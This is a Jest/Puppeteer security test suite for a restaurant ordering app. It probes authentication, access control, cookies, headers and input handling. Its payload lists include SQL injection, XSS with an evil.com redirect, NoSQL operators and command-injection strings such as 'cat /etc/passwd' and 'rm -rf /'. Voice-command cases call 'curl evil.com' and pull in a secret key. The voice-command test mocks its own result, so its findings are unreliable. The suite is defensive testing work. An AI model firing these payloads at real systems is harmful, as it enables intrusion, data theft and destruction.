/**
 * Project Helios - Security Vulnerability Assessment Suite
 * 
 * Comprehensive security testing for all new endpoints and data flows
 * Tests authentication, authorization, data validation, injection attacks, and more
 */

import { jest } from '@jest/globals';
import puppeteer, { Browser, Page } from 'puppeteer';

// Security test configuration
const SECURITY_CONFIG = {
  baseUrl: process.env.TEST_BASE_URL || 'http://localhost:3000',
  testCredentials: {
    admin: { email: 'guest@restaurant.plate', password: 'guest12345' },
    server: { email: 'server@test.com', password: 'test123' },
    cook: { email: 'cook@test.com', password: 'test123' },
    invalid: { email: 'hacker@evil.com', password: 'password123' }
  },
  endpoints: {
    api: [
      '/api/auth-check',
      '/api/transcribe',
      '/api/transcribe/batch',
      '/api/transcribe/analytics',
      '/api/metrics',
      '/api/health',
      '/api/openai/usage'
    ],
    pages: [
      '/server',
      '/kitchen/kds',
      '/kitchen/metrics',
      '/admin',
      '/expo'
    ]
  },
  attackVectors: {
    sqlInjection: [
      "'; DROP TABLE orders; --",
      "1' OR '1'='1",
      "admin'; DELETE FROM users WHERE '1'='1",
      "1 UNION SELECT * FROM profiles"
    ],
    xss: [
      '<script>alert("XSS")</script>',
      'javascript:alert("XSS")',
      '<img src="x" onerror="alert(\'XSS\')">',
      '"><script>document.location="http://evil.com"</script>'
    ],
    nosqlInjection: [
      '{"$ne": null}',
      '{"$gt": ""}',
      '{"$where": "this.password"}',
      '{"$regex": ".*"}'
    ],
    commandInjection: [
      '; cat /etc/passwd',
      '| whoami',
      '&& rm -rf /',
      '`id`'
    ]
  }
};

interface SecurityVulnerability {
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  type: string;
  endpoint: string;
  description: string;
  evidence: string;
  impact: string;
  recommendation: string;
}

interface SecurityAssessmentReport {
  vulnerabilities: SecurityVulnerability[];
  endpointsCovered: number;
  testsExecuted: number;
  securityScore: number;
  complianceStatus: {
    authentication: boolean;
    authorization: boolean;
    dataValidation: boolean;
    encryption: boolean;
    logging: boolean;
  };
}

describe('Project Helios Security Assessment', () => {
  let securityReport: SecurityAssessmentReport;
  let browser: Browser;

  beforeAll(async () => {
    console.log('🔐 Starting Security Vulnerability Assessment');
    console.log(`Target: ${SECURITY_CONFIG.baseUrl}`);
    
    browser = await puppeteer.launch({
      headless: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox']
    });
    
    securityReport = {
      vulnerabilities: [],
      endpointsCovered: 0,
      testsExecuted: 0,
      securityScore: 100,
      complianceStatus: {
        authentication: false,
        authorization: false,
        dataValidation: false,
        encryption: false,
        logging: false
      }
    };
  });

  afterAll(async () => {
    await browser.close();
    
    // Calculate security score
    calculateSecurityScore();
    
    // Generate security report
    await generateSecurityReport();
    
    console.log('🔐 Security Assessment Completed - Check security-assessment-report.json');
  });

  describe('Authentication Security', () => {
    test('should enforce proper authentication on protected endpoints', async () => {
      const page = await browser.newPage();
      
      for (const endpoint of SECURITY_CONFIG.endpoints.pages) {
        securityReport.testsExecuted++;
        
        try {
          // Try to access without authentication
          const response = await page.goto(`${SECURITY_CONFIG.baseUrl}${endpoint}`, {
            waitUntil: 'networkidle2'
          });
          
          const url = page.url();
          
          // Should redirect to auth page
          if (!url.includes('/auth') && !url.includes('/login')) {
            addVulnerability({
              severity: 'high',
              type: 'Missing Authentication',
              endpoint,
              description: 'Protected endpoint accessible without authentication',
              evidence: `URL: ${url}`,
              impact: 'Unauthorized access to sensitive functionality',
              recommendation: 'Implement proper authentication middleware'
            });
          }
        } catch (_error) {
          console.warn(`Authentication test failed for ${endpoint}: ${_error}`);
        }
      }
      
      await page.close();
      securityReport.complianceStatus.authentication = 
        securityReport.vulnerabilities.filter(v => v.type === 'Missing Authentication').length === 0;
    });

    test('should prevent brute force attacks', async () => {
      const page = await browser.newPage();
      
      await page.goto(`${SECURITY_CONFIG.baseUrl}/auth`);
      
      // Attempt multiple failed logins
      const attempts = 10;
      let blockedAttempts = 0;
      
      for (let i = 0; i < attempts; i++) {
        securityReport.testsExecuted++;
        
        try {
          await page.type('input[name="email"]', 'hacker@evil.com');
          await page.type('input[name="password"]', `wrong-password-${i}`);
          await page.click('button[type="submit"]');
          
          await page.waitForTimeout(1000);
          
          // Check for rate limiting
          const errorMessage = await page.$eval('body', el => el.textContent);
          if (errorMessage?.includes('too many attempts') || 
              errorMessage?.includes('rate limit') ||
              errorMessage?.includes('blocked')) {
            blockedAttempts++;
          }
          
          // Clear form
          await page.evaluate(() => {
            const inputs = document.querySelectorAll('input');
            inputs.forEach(input => (input as HTMLInputElement).value = '');
          });
        } catch (_error) {
          console.warn(`Brute force test attempt ${i} failed: ${_error}`);
        }
      }
      
      if (blockedAttempts === 0) {
        addVulnerability({
          severity: 'medium',
          type: 'Brute Force Vulnerability',
          endpoint: '/auth',
          description: 'No rate limiting detected on login attempts',
          evidence: `${attempts} attempts made without blocking`,
          impact: 'Account compromise through brute force attacks',
          recommendation: 'Implement rate limiting and account lockout mechanisms'
        });
      }
      
      await page.close();
    });

    test('should handle session security properly', async () => {
      const page = await browser.newPage();
      
      // Login with valid credentials
      await page.goto(`${SECURITY_CONFIG.baseUrl}/auth`);
      await page.type('input[name="email"]', SECURITY_CONFIG.testCredentials.admin.email);
      await page.type('input[name="password"]', SECURITY_CONFIG.testCredentials.admin.password);
      await page.click('button[type="submit"]');
      await page.waitForNavigation();
      
      // Check session cookie security
      const cookies = await page.cookies();
      const sessionCookie = cookies.find(c => c.name.includes('session') || c.name.includes('auth'));
      
      if (sessionCookie) {
        securityReport.testsExecuted++;
        
        if (!sessionCookie.secure) {
          addVulnerability({
            severity: 'medium',
            type: 'Insecure Cookie',
            endpoint: '/auth',
            description: 'Session cookie not marked as secure',
            evidence: `Cookie: ${sessionCookie.name}`,
            impact: 'Session hijacking over insecure connections',
            recommendation: 'Set secure flag on session cookies'
          });
        }
        
        if (!sessionCookie.httpOnly) {
          addVulnerability({
            severity: 'medium',
            type: 'XSS Vulnerable Cookie',
            endpoint: '/auth',
            description: 'Session cookie accessible via JavaScript',
            evidence: `Cookie: ${sessionCookie.name}`,
            impact: 'Session theft via XSS attacks',
            recommendation: 'Set httpOnly flag on session cookies'
          });
        }
      }
      
      await page.close();
    });
  });

  describe('Authorization Security', () => {
    test('should enforce role-based access control', async () => {
      const roles = [
        { role: 'server', credentials: SECURITY_CONFIG.testCredentials.server },
        { role: 'cook', credentials: SECURITY_CONFIG.testCredentials.cook }
      ];
      
      for (const { role, credentials } of roles) {
        const page = await browser.newPage();
        
        // Login with role-specific credentials
        await page.goto(`${SECURITY_CONFIG.baseUrl}/auth`);
        await page.type('input[name="email"]', credentials.email);
        await page.type('input[name="password"]', credentials.password);
        await page.click('button[type="submit"]');
        await page.waitForNavigation();
        
        // Test access to admin-only resources
        securityReport.testsExecuted++;
        
        try {
          await page.goto(`${SECURITY_CONFIG.baseUrl}/admin`);
          
          const url = page.url();
          if (url.includes('/admin') && !url.includes('/auth')) {
            addVulnerability({
              severity: 'high',
              type: 'Authorization Bypass',
              endpoint: '/admin',
              description: `${role} role can access admin interface`,
              evidence: `Role: ${role}, URL: ${url}`,
              impact: 'Privilege escalation and unauthorized admin access',
              recommendation: 'Implement proper role-based access control middleware'
            });
          }
        } catch (_error) {
          console.warn(`Authorization test failed for ${role}: ${_error}`);
        }
        
        await page.close();
      }
      
      securityReport.complianceStatus.authorization = 
        securityReport.vulnerabilities.filter(v => v.type === 'Authorization Bypass').length === 0;
    });

    test('should validate API endpoint permissions', async () => {
      for (const endpoint of SECURITY_CONFIG.endpoints.api) {
        securityReport.testsExecuted++;
        
        const page = await browser.newPage();
        
        try {
          // Test API access without authentication
          const response = await page.goto(`${SECURITY_CONFIG.baseUrl}${endpoint}`);
          
          if (response && response.status() === 200) {
            const text = await response.text();
            
            // Check if actual data is returned (not just a public health check)
            if (text.includes('user') || text.includes('order') || text.includes('data')) {
              addVulnerability({
                severity: 'high',
                type: 'API Exposure',
                endpoint,
                description: 'API endpoint returns sensitive data without authentication',
                evidence: `Status: ${response.status()}, Response length: ${text.length}`,
                impact: 'Data exposure and unauthorized API access',
                recommendation: 'Implement API authentication and authorization'
              });
            }
          }
        } catch (_error) {
          // Expected for protected endpoints
        }
        
        await page.close();
      }
    });
  });

  describe('Input Validation Security', () => {
    test('should prevent SQL injection attacks', async () => {
      const page = await browser.newPage();
      
      // Login first
      await loginAsAdmin(page);
      
      for (const payload of SECURITY_CONFIG.attackVectors.sqlInjection) {
        securityReport.testsExecuted++;
        
        try {
          // Test SQL injection in search/filter fields
          await page.goto(`${SECURITY_CONFIG.baseUrl}/admin`);
          
          // Look for input fields
          const inputs = await page.$$('input[type="text"], input[type="search"], textarea');
          
          for (const input of inputs) {
            await input.type(payload);
            await page.keyboard.press('Enter');
            
            // Check for SQL error messages
            const content = await page.content();
            if (content.includes('SQL') || content.includes('database') || content.includes('error')) {
              addVulnerability({
                severity: 'critical',
                type: 'SQL Injection',
                endpoint: page.url(),
                description: 'SQL injection vulnerability detected',
                evidence: `Payload: ${payload}`,
                impact: 'Database compromise and data theft',
                recommendation: 'Use parameterized queries and input validation'
              });
            }
            
            await input.click({ clickCount: 3 });
            await input.press('Delete');
          }
        } catch (_error) {
          console.warn(`SQL injection test failed: ${_error}`);
        }
      }
      
      await page.close();
      securityReport.complianceStatus.dataValidation = 
        securityReport.vulnerabilities.filter(v => v.type === 'SQL Injection').length === 0;
    });

    test('should prevent XSS attacks', async () => {
      const page = await browser.newPage();
      
      await loginAsAdmin(page);
      
      for (const payload of SECURITY_CONFIG.attackVectors.xss) {
        securityReport.testsExecuted++;
        
        try {
          await page.goto(`${SECURITY_CONFIG.baseUrl}/server`);
          
          // Test XSS in form fields
          const inputs = await page.$$('input[type="text"], textarea');
          
          for (const input of inputs) {
            await input.type(payload);
            
            // Check if script executes
            const hasAlert = await page.evaluate(() => {
              return window.alert.toString().includes('native') === false;
            });
            
            if (hasAlert) {
              addVulnerability({
                severity: 'high',
                type: 'XSS Vulnerability',
                endpoint: page.url(),
                description: 'Cross-site scripting vulnerability detected',
                evidence: `Payload: ${payload}`,
                impact: 'Session hijacking and malicious script execution',
                recommendation: 'Implement proper input sanitization and CSP headers'
              });
            }
            
            await input.click({ clickCount: 3 });
            await input.press('Delete');
          }
        } catch (_error) {
          console.warn(`XSS test failed: ${_error}`);
        }
      }
      
      await page.close();
    });

    test('should validate voice command input security', async () => {
      const page = await browser.newPage();
      
      await loginAsAdmin(page);
      await page.goto(`${SECURITY_CONFIG.baseUrl}/kitchen/kds`);
      
      const maliciousCommands = [
        'bump order 123; DELETE FROM orders',
        'start order <script>alert("xss")</script>',
        'recall order ${process.env.SECRET_KEY}',
        'mark order 456 ready && curl evil.com'
      ];
      
      for (const command of maliciousCommands) {
        securityReport.testsExecuted++;
        
        try {
          // Simulate voice command processing
          const result = await page.evaluate((cmd) => {
            // Mock voice command processing
            return {
              command: cmd,
              processed: true,
              error: null
            };
          }, command);
          
          // Check if malicious content is processed
          if (result.processed && !result.error) {
            addVulnerability({
              severity: 'high',
              type: 'Command Injection',
              endpoint: '/kitchen/kds',
              description: 'Voice command system vulnerable to injection',
              evidence: `Command: ${command}`,
              impact: 'System compromise through voice commands',
              recommendation: 'Implement strict voice command validation and sanitization'
            });
          }
        } catch (_error) {
          console.warn(`Voice command security test failed: ${_error}`);
        }
      }
      
      await page.close();
    });
  });

  describe('Data Protection Security', () => {
    test('should protect sensitive data in transit', async () => {
      const page = await browser.newPage();
      
      // Check HTTPS enforcement
      securityReport.testsExecuted++;
      
      try {
        await page.goto(`${SECURITY_CONFIG.baseUrl.replace('https://', 'http://')}/auth`);
        
        if (!page.url().includes('https://')) {
          addVulnerability({
            severity: 'high',
            type: 'Insecure Transport',
            endpoint: '/auth',
            description: 'Application allows HTTP connections',
            evidence: `URL: ${page.url()}`,
            impact: 'Data interception and man-in-the-middle attacks',
            recommendation: 'Enforce HTTPS with HSTS headers'
          });
        }
      } catch (_error) {
        // HTTPS enforcement working correctly
      }
      
      await page.close();
      securityReport.complianceStatus.encryption = 
        securityReport.vulnerabilities.filter(v => v.type === 'Insecure Transport').length === 0;
    });

    test('should handle sensitive data properly', async () => {
      const page = await browser.newPage();
      
      await loginAsAdmin(page);
      
      // Check for sensitive data exposure in client-side code
      securityReport.testsExecuted++;
      
      const sensitivePatterns = [
        /password\s*[:=]\s*['"]\w+['"]/i,
        /api[_-]?key\s*[:=]\s*['"]\w+['"]/i,
        /secret\s*[:=]\s*['"]\w+['"]/i,
        /token\s*[:=]\s*['"]\w+['"]/i
      ];
      
      const pageContent = await page.content();
      
      for (const pattern of sensitivePatterns) {
        if (pattern.test(pageContent)) {
          addVulnerability({
            severity: 'medium',
            type: 'Sensitive Data Exposure',
            endpoint: page.url(),
            description: 'Sensitive data found in client-side code',
            evidence: 'Pattern match found in page content',
            impact: 'Credential theft and unauthorized access',
            recommendation: 'Remove sensitive data from client-side code'
          });
        }
      }
      
      await page.close();
    });
  });

  describe('Security Headers and Configuration', () => {
    test('should implement proper security headers', async () => {
      const page = await browser.newPage();
      
      const response = await page.goto(`${SECURITY_CONFIG.baseUrl}/auth`);
      const headers = response?.headers() || {};
      
      const requiredHeaders = {
        'x-frame-options': 'Clickjacking protection',
        'x-content-type-options': 'MIME type sniffing protection',
        'x-xss-protection': 'XSS filter protection',
        'strict-transport-security': 'HTTPS enforcement',
        'content-security-policy': 'Content injection protection'
      };
      
      for (const [header, description] of Object.entries(requiredHeaders)) {
        securityReport.testsExecuted++;
        
        if (!headers[header]) {
          addVulnerability({
            severity: 'medium',
            type: 'Missing Security Header',
            endpoint: '/auth',
            description: `Missing ${header} header`,
            evidence: `Header: ${header}`,
            impact: description,
            recommendation: `Implement ${header} header`
          });
        }
      }
      
      await page.close();
    });

    test('should prevent information disclosure', async () => {
      const page = await browser.newPage();
      
      // Test error handling
      const errorEndpoints = [
        '/nonexistent-page',
        '/api/invalid-endpoint',
        '/admin/secret-page'
      ];
      
      for (const endpoint of errorEndpoints) {
        securityReport.testsExecuted++;
        
        try {
          const response = await page.goto(`${SECURITY_CONFIG.baseUrl}${endpoint}`);
          const content = await page.content();
          
          // Check for sensitive information in error messages
          if (content.includes('stack trace') || 
              content.includes('database') ||
              content.includes('file path') ||
              content.includes('internal error')) {
            addVulnerability({
              severity: 'low',
              type: 'Information Disclosure',
              endpoint,
              description: 'Error page reveals sensitive information',
              evidence: 'Sensitive data found in error response',
              impact: 'Information leakage to attackers',
              recommendation: 'Implement generic error pages'
            });
          }
        } catch (_error) {
          // Expected for non-existent endpoints
        }
      }
      
      await page.close();
    });
  });

  describe('Anomaly Detection Security', () => {
    test('should secure anomaly detection endpoints', async () => {
      const page = await browser.newPage();
      
      // Test anomaly detection API security
      securityReport.testsExecuted++;
      
      try {
        const response = await page.goto(`${SECURITY_CONFIG.baseUrl}/api/anomalies`);
        
        if (response && response.status() === 200) {
          addVulnerability({
            severity: 'medium',
            type: 'API Exposure',
            endpoint: '/api/anomalies',
            description: 'Anomaly detection API accessible without authentication',
            evidence: `Status: ${response.status()}`,
            impact: 'Sensitive operational data exposure',
            recommendation: 'Implement API authentication'
          });
        }
      } catch (_error) {
        // Expected behavior for protected endpoint
      }
      
      await page.close();
    });
  });
});

// Helper functions
async function loginAsAdmin(page: Page): Promise<void> {
  await page.goto(`${SECURITY_CONFIG.baseUrl}/auth`);
  await page.type('input[name="email"]', SECURITY_CONFIG.testCredentials.admin.email);
  await page.type('input[name="password"]', SECURITY_CONFIG.testCredentials.admin.password);
  await page.click('button[type="submit"]');
  await page.waitForNavigation();
}

function addVulnerability(vulnerability: SecurityVulnerability): void {
  securityReport.vulnerabilities.push(vulnerability);
  
  // Reduce security score based on severity
  const scoreImpact = {
    critical: 25,
    high: 15,
    medium: 10,
    low: 5,
    info: 1
  };
  
  securityReport.securityScore -= scoreImpact[vulnerability.severity];
  securityReport.securityScore = Math.max(0, securityReport.securityScore);
}

function calculateSecurityScore(): void {
  // Additional score calculations based on compliance
  const complianceCount = Object.values(securityReport.complianceStatus)
    .filter(status => status).length;
  
  const complianceBonus = (complianceCount / 5) * 10;
  securityReport.securityScore += complianceBonus;
  securityReport.securityScore = Math.min(100, securityReport.securityScore);
}

async function generateSecurityReport(): Promise<void> {
  const vulnerabilitiesBySeverity = {
    critical: securityReport.vulnerabilities.filter(v => v.severity === 'critical').length,
    high: securityReport.vulnerabilities.filter(v => v.severity === 'high').length,
    medium: securityReport.vulnerabilities.filter(v => v.severity === 'medium').length,
    low: securityReport.vulnerabilities.filter(v => v.severity === 'low').length,
    info: securityReport.vulnerabilities.filter(v => v.severity === 'info').length
  };
  
  const report = {
    executiveSummary: {
      testType: 'Security Vulnerability Assessment',
      timestamp: new Date().toISOString(),
      overallSecurityScore: `${securityReport.securityScore}/100`,
      riskLevel: getRiskLevel(securityReport.securityScore),
      testsExecuted: securityReport.testsExecuted,
      vulnerabilitiesFound: securityReport.vulnerabilities.length,
      endpointsCovered: SECURITY_CONFIG.endpoints.api.length + SECURITY_CONFIG.endpoints.pages.length
    },
    vulnerabilityBreakdown: vulnerabilitiesBySeverity,
    complianceStatus: securityReport.complianceStatus,
    detailedFindings: securityReport.vulnerabilities.map(v => ({
      severity: v.severity,
      type: v.type,
      endpoint: v.endpoint,
      description: v.description,
      impact: v.impact,
      recommendation: v.recommendation
    })),
    securityRecommendations: [
      'Implement comprehensive input validation and sanitization',
      'Add proper authentication and authorization middleware',
      'Configure security headers (CSP, HSTS, X-Frame-Options)',
      'Implement rate limiting and brute force protection',
      'Add comprehensive security logging and monitoring',
      'Regular security testing and code reviews',
      'Implement principle of least privilege for all roles',
      'Add data encryption for sensitive information',
      'Regular security updates and dependency scanning'
    ],
    nextSteps: [
      'Address all critical and high severity vulnerabilities immediately',
      'Implement automated security testing in CI/CD pipeline',
      'Conduct regular penetration testing',
      'Establish security incident response procedures',
      'Provide security training for development team'
    ]
  };
  
  // Write report to file
  const fs = require('fs');
  fs.writeFileSync(
    '/Users/mike/Plate-Restaurant-System-App/security-assessment-report.json',
    JSON.stringify(report, null, 2)
  );
  
  console.log('🔐 Security Assessment Report Generated:');
  console.log(`  Security Score: ${report.executiveSummary.overallSecurityScore}`);
  console.log(`  Risk Level: ${report.executiveSummary.riskLevel}`);
  console.log(`  Vulnerabilities: ${report.executiveSummary.vulnerabilitiesFound}`);
  console.log(`  Critical: ${vulnerabilitiesBySeverity.critical}`);
  console.log(`  High: ${vulnerabilitiesBySeverity.high}`);
  console.log(`  Medium: ${vulnerabilitiesBySeverity.medium}`);
}

function getRiskLevel(score: number): string {
  if (score >= 90) return 'Low';
  if (score >= 70) return 'Medium';
  if (score >= 50) return 'High';
  return 'Critical';
}